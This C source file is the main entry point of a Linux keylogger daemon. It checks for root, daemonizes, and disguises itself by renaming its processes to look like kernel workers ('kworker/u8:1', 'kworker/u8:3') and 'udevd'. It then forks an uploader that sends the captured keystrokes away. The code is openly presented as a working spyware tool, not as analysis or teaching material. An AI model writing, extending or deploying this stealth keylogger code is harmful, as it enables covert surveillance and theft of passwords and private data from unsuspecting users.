/**
 * @file main.c
 * @author Sanjay Vijayakumar
 * @brief Main entry point for the keylogger daemon.
 * @version 0.1
 * @date 2025-06-18
 *
 * @copyright Copyright (c) 2025
 *
 */

#include <stdio.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <errno.h>
#include <syslog.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include "../include/daemon.h"
#include "../include/logger.h"
#include "../include/uploader.h"
#include "../include/config.h"

__pid_t sender_pid;

void cleanup(void)
{
    // Remove the PID file
    unlink(PID_FILE);
    syslog(LOG_INFO, "Main Daemon exiting. Cleaned up PID file.");
}

void spoof_process_name(int argc, char **argv)
{
    const char *fake_name = "kworker/u8:1";
    strncpy(argv[0], fake_name, strlen(argv[0]));
    for (int i = 1; i < argc; i++)
    {
        memset(argv[i], 0, strlen(argv[i]));
    }
}

int main(int argc, char *argv[])
{

    if (geteuid() != 0)
    {
        fprintf(stderr, "This program must be run as root.\n");
        return 1;
    }

    if (is_already_running())
    {
        printf("Another instance is already running.\n");
        return 1;
    }

    char device[MAX_SIZE];
    char handler[MAX_SIZE];

    for (int i = 1; i < argc; i++)
    {
        if (strcmp(argv[i], "--h") == 0 || strcmp(argv[i], "--help") == 0)
        {
            printf("A Linux API Keylogger\n");
            printf("Usage: keylogger [options]\n");
            printf("options\n");
            printf("  --help          Show this help message\n");
            exit(0);
        }
    }

    spoof_process_name(argc, argv);
    daemonize();

    sender_pid = fork();
    if (sender_pid == 0)
    {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        prctl(PR_SET_NAME, "udevd", 0, 0, 0);
        run_uploader();
    }
    else if (sender_pid > 0)
    {   
        atexit(cleanup);
        prctl(PR_SET_NAME, "kworker/u8:3", 0, 0, 0);
        get_handler(device, handler);
        connect_handler(handler);
    }
    else
    {
        syslog(LOG_ERR, "Fork failed: %s", strerror(errno));
        exit(EXIT_FAILURE);
    }

    return 0;
}